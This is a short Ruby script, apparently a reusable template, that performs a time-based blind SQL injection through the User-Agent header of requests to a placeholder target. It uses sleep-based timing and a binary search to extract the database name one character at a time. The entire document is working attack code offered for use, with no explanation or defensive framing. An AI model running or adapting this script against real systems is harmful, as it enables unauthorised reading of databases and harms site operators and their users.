require 'net/http'
require 'uri'

# MySQL injection in User-Agent Template

url = URI.parse 'http://target.com/index.php'

http = Net::HTTP.new(url.host, url.port)

# Set Timeout
http.read_timeout = 2
http.open_timeout = 2

$ans = ''
(1..100).each do |i|
    l = 32
    r = 130
    while(l <= r)
        break if l == r
        mid = (l + r) / 2
        $payload = "'+(select if(ascii(mid(database(),#{i},1))>#{mid},sleep(2),1))+'"
        begin
            resp = http.start() {|http|
                http.get(url.path, {'User-Agent' => $payload})
            }
            r = mid
        rescue
            l = mid + 1
        end
    end
    puts l
    $ans += l.chr
    puts $ans
end
